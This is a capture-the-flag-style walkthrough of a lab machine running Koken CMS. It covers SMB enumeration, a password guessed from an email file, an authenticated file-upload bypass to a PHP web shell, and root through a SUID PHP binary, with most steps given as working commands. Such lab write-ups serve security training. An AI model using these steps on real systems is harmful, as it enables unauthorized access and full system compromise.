## Box : 192.168.193.76

## Nmap Scan
```text
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.x–4.x  
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
8000/tcp open  http    Apache httpd 2.4.18 (Koken 0.22.24)
```

## Web Enumeration (Port 8000)
- **Landing URL:** `http://192.168.193.76:8000/`  
- **CMS:** Koken 0.22.24 (from `<meta name="generator" content="Koken 0.22.24" />`)  
- **Vuln:** Arbitrary File Upload (Authenticated) [Exploit-DB 48706]

### Directory Fuzzing
```bash
gobuster dir -u http://192.168.193.76:8000 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
Found `/admin/`.

### SMB Share Enumeration
```bash
smbclient -L //192.168.193.76/ -N
```
Shares:
- `sambashare` → contains `mailsent.txt`, `wordpress.bkp.zip`

```bash
smbclient //192.168.193.76/sambashare -N
smb: \> get mailsent.txt
```

## Credentials Discovery
`mailsent.txt` reveals:
```text
To: Daisa Ahomi <daisa@photographer.com>
Don't forget your secret, my babygirl ;)
```
- **Creds:** `daisa@photographer.com:babygirl`

## Initial Foothold
1. **Login** to Koken admin at `/admin/` with above creds.  
2. **Upload** a PHP reverse shell renamed from `image.php.jpg` to `image.php` via Burp.  
3. **Trigger** shell:
   ```
   http://192.168.193.76:8000/storage/originals/.../image.php?cmd=id
   ```
4. **Shell** as `www-data`.

## Privilege Escalation

### SUID Binary Enumeration
```bash
find / -perm -u=s -type f 2>/dev/null
```
Notable: `/usr/bin/php7.2` (SUID root).

### GTFOBins Exploit for PHP
```bash
# Create SUID copy
cp /usr/bin/php7.2 /tmp/php
chmod +s /tmp/php

# Spawn shell with preserved privileges
/tmp/php -r "pcntl_exec('/bin/sh', ['-p']);"
```
- **Result:** Root shell
